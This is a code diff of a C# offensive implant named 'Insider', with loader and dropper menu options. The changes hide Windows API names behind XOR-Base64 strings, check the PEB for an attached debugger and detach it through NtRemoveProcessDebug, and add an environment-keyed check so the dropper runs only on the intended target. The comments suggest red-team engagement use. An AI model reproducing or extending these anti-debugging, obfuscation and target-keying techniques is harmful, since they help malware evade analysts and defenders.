 
-                if (serialnum.Equals("3"))
-                {
-                    System.Environment.Exit(1);
-                }
-                else if (serialnum.Equals("1"))
-                {
-                    Console.Write("[>] Enter Sub-options [1.1/1.2]: ");
-                    string arg = Console.ReadLine();
-                    Loader(arg);
-                }
-                else if(serialnum.Equals("2"))
-                {
-                    Console.Write("[>] Enter Sub-options [2.1/2.2]: ");
-                    string arg = Console.ReadLine();
-                    Dropper(arg);
-
-                }
-                else
-                {
-                    Console.WriteLine("[-] Wrong option!");
-                    System.Environment.Exit(1);
-                }
+				if (serialnum.Equals("3"))
+				{
+					System.Environment.Exit(1);
+				}
+				else if (serialnum.Equals("1"))
+				{
+					Loader();
+				}
+				else if(serialnum.Equals("2"))
+				{
+					Dropper();
+				}
+				else
+				{
+					Console.WriteLine("[-] Wrong option!");
+					System.Environment.Exit(1);
+				}
             }
 
             public static bool IsAdministrator()
@@ -881,152 +844,183 @@ namespace Insider
 
             public static void CheckDebugger()
             {
-                /*
-                if (IsDebuggerPresent())
-                {
-                    Console.WriteLine("\n[!] Status: Implant is attached to a Debugger: {0}\n", IsDebuggerPresent());
-                    System.Environment.Exit(1);
-                }
-                */
+               /*
+				if (IsDebuggerPresent())
+				{
+					Console.WriteLine("\n[!] Status: Implant is attached to a Debugger: {0}\n", IsDebuggerPresent());
+					System.Environment.Exit(1);
+				}
+				*/
 
-                // ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
+				// ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
 
-                string ntdll = "ntdll";
-                IntPtr phandle = Process.GetCurrentProcess().Handle;
+				IntPtr phandle = Process.GetCurrentProcess().Handle;
 
-                // http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
-                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
-                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
-
-
-                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.sizeof?view=net-6.0
-                // Returns the unmanaged size of an object in bytes
-                uint processInformationLength = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
+				// http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
+				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
+				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
 
 
-                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=net-6.0#system-runtime-interopservices-marshal-allochglobal(system-int32)
-                // public static IntPtr AllocHGlobal (int cb);
-                // Input parameter, cb = The required number of bytes in memory
-
-                //      cb != processInformationLength
-                // or,  cb != (uint)Marshal.SizeOf(typeof(ProcessBasicInformation))
-                // cb == Marshal.SizeOf(typeof(ProcessBasicInformation));
-
-                // as the number required by cb should be in bytes.
-
-                IntPtr processInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));
-
-                uint returnLength = 0;
-
-                /*
-                // PInvoke
-                NtQueryInformationProcess(
-                phandle,
-                0,
-                processInformation,         // -> [out]     =>  returns processInformation
-                processInformationLength,
-                ref returnLength
-                );
-                */
-
-                // delegate
-                IntPtr funcaddr7 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
-                NtQIP ntqip = (NtQIP)Marshal.GetDelegateForFunctionPointer(funcaddr7, typeof(NtQIP));
-
-                ntqip(
-                phandle,
-                0,
-                processInformation,         // -> [out]     =>  returns processInformation
-                processInformationLength,
-                ref returnLength
-                );
+				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.sizeof?view=net-6.0
+				// Returns the unmanaged size of an object in bytes
+				uint processInformationLength = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
 
 
-                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
-                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=net-6.0#system-runtime-interopservices-marshal-ptrtostructure(system-intptr-system-type)
-                
-                // link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view
-                // returns: object type -> needs typecasting
-                PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(PROCESS_BASIC_INFORMATION));
+				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=net-6.0#system-runtime-interopservices-marshal-allochglobal(system-int32)
+				// public static IntPtr AllocHGlobal (int cb);
+				// Input parameter, cb = The required number of bytes in memory
 
-                // Getting the base address of the PEB structure of our current process
-                // According to https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb:
-                // Baseaddress of PEB + 2 byte (RVA) = Absolute address of the BeingDebugged member of the PEB structure
-                
-                // Getting base address of PEB
-                IntPtr Pebptr = pbi.PebAddress;
-                
-                // Getting absolute address of BeingDebugged member of the PEB structure
-                // link: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.readbyte?view=net-6.0#system-runtime-interopservices-marshal-readbyte(system-intptr)
-                byte check = Marshal.ReadByte(Pebptr+2);
+				//      cb != processInformationLength
+				// or,  cb != (uint)Marshal.SizeOf(typeof(ProcessBasicInformation))
+				// cb == Marshal.SizeOf(typeof(ProcessBasicInformation));
 
-                if (check.Equals(1))
-                {
-                    Console.Write("\n[!] Status: Implant is attached to a Debugger\t");
+				// as the number required by cb should be in bytes.
 
-                    //Detaching our implant from attached debugger
-                    // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html
+				IntPtr processInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));
 
+				uint returnLength = 0;
 
-                    // https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
-                    IntPtr debuggerhandle = IntPtr.Zero;
+				/*
+				// PInvoke
+				NtQueryInformationProcess(
+				phandle,
+				0,
+				processInformation,         // -> [out]     =>  returns processInformation
+				processInformationLength,
+				ref returnLength
+				);
+				*/
 
-                    uint outlength = 0;
+				// delegate
+				//IntPtr funcaddr7 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
 
-                    /*
-                    // PInvoke
-                    NtQueryInformationProcess(
-                    phandle,
-                    0x1e,               // ProcessDebugObjectHandle = 0x1E
-                    ref debuggerhandle,
-                    8,          // 64bit => 8byte
-                    ref outlength
-                    );
-                    */
+				string nt = "HBESCQI="; // Xor-Base64(ntdll)
+				string ntq = "PBEnEAsVSXlZFAoECA8TWV9ZIhcZBgsUQw=="; // Xor-Base64(NtQueryInformationProcess)
 
-                    // delegate
-                    //IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+				IntPtr funcaddr7 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(nt)), XOR_B64_Decrypt(ntq));
+				NtQIP ntqip = (NtQIP)Marshal.GetDelegateForFunctionPointer(funcaddr7, typeof(NtQIP));
 
-                    IntPtr funcaddr8 = GetProcAddress(LoadLibrary(ntdll), "NtQueryInformationProcess");
-                    NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));
-
-                    ntqip2(
-                    phandle,
-                    0x1e,               // ProcessDebugObjectHandle = 0x1E
-                    ref debuggerhandle,
-                    8,          // 64bit => 8byte
-                    ref outlength
-                    );
+				ntqip(
+				phandle,
+				0,
+				processInformation,         // -> [out]     =>  returns processInformation
+				processInformationLength,
+				ref returnLength
+				);
 
 
-                    Console.WriteLine("-> Debug handle: {0}", debuggerhandle);
+				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
+				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=net-6.0#system-runtime-interopservices-marshal-ptrtostructure(system-intptr-system-type)
+				
+				// link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view
+				// returns: object type -> needs typecasting
+				PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(PROCESS_BASIC_INFORMATION));
 
-                    Console.Write("[*] Trying to detach Debugger : ");
-                    //calling NtRemoveProcessDebug for Detaching debugger from implant process
-                    // PInvoke
-                    //int status = NtRemoveProcessDebug(phandle, debuggerhandle);
+				// Getting the base address of the PEB structure of our current process
+				// According to https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb:
+				// Baseaddress of PEB + 2 byte (RVA) = Absolute address of the BeingDebugged member of the PEB structure
+				
+				// Getting base address of PEB
+				IntPtr Pebptr = pbi.PebAddress;
+				
+				// Getting absolute address of BeingDebugged member of the PEB structure
+				// link: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.readbyte?view=net-6.0#system-runtime-interopservices-marshal-readbyte(system-intptr)
+				byte check = Marshal.ReadByte(Pebptr+2);
 
-                    // delegate
-                    //IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");
+				if (check.Equals(1))
+				{
+					Console.Write("\n[!] Status: Implant is attached to a Debugger\t");
 
-                    IntPtr funcaddr9 = GetProcAddress(LoadLibrary(ntdll), "NtRemoveProcessDebug");
-                    NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));
+					//Detaching our implant from attached debugger
+					// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html
 
-                    int status = ntrpd(phandle, debuggerhandle);
 
-                    if (status == 0)
-                    {
-                        Console.WriteLine("[DONE!]");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[Oops! Unable to detach...]");
-                    }
-                }   
+					// https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
+					IntPtr debuggerhandle = IntPtr.Zero;
+
+					uint outlength = 0;
+
+					/*
+					// PInvoke
+					NtQueryInformationProcess(
+					phandle,
+					0x1e,               // ProcessDebugObjectHandle = 0x1E
+					ref debuggerhandle,
+					8,          // 64bit => 8byte
+					ref outlength
+					);
+					*/
+
+					// delegate
+					//IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+					IntPtr funcaddr8 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(nt)), XOR_B64_Decrypt(ntq));
+					NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));
+
+					ntqip2(
+					phandle,
+					0x1e,               // ProcessDebugObjectHandle = 0x1E
+					ref debuggerhandle,
+					8,          // 64bit => 8byte
+					ref outlength
+					);
+
+
+					Console.WriteLine("-> Debug handle: {0}", debuggerhandle);
+
+					Console.Write("[*] Trying to detach Debugger : ");
+					//calling NtRemoveProcessDebug for Detaching debugger from implant process
+					// PInvoke
+					//int status = NtRemoveProcessDebug(phandle, debuggerhandle);
+
+					// delegate
+					//IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");
+
+					string str_ntrpd = "PBEkAAMIRlVnAAoVAB0UdFVVBwI="; // Xor-Base64(NtRemoveProcessDebug)
+
+					IntPtr funcaddr9 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(nt)), XOR_B64_Decrypt(str_ntrpd));
+					NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));
+
+					int status = ntrpd(phandle, debuggerhandle);
+
+					if (status == 0)
+					{
+						Console.WriteLine("[DONE!]");
+					}
+					else
+					{
+						Console.WriteLine("[Oops! Unable to detach...]");
+					}
+				}
             }
+			
+			// Checking whether target machine is intended target machine or not.
+			public static void CheckTarget()
+			{
+				// Using just testing string to perform the checking of xor key,
+				// Whether xorkey(username) used by dropper is same as xorkey that 
+				// Operator used while making the test string encrypted.
+				string testontarget = "BgAFEQEJRFFFFQAC"; // Xor-Base64(testontarget)  
+
+				string decoded = XOR_B64_Decrypt(testontarget);
+
+				// Not matching
+				if (!String.Equals(decoded,"testontarget"))
+				{
+					Console.WriteLine("\n[!] Not a valid Target!\tStopping Execution of this dropper...");
+					System.Environment.Exit(1);
+				}
+				else
+				{
+					Console.WriteLine("\n[+] Valid Target Test: [Successfully Passed]\n[*] Starting execution of Insider...");
+				}
+			}
 
             static void Main()
             {
+				// Checking whether target windows machine is intended target or out of scope/engagement
+				CheckTarget();
+				
                 bool check = IsAdministrator();
                 if (check.Equals("true"))
                 {
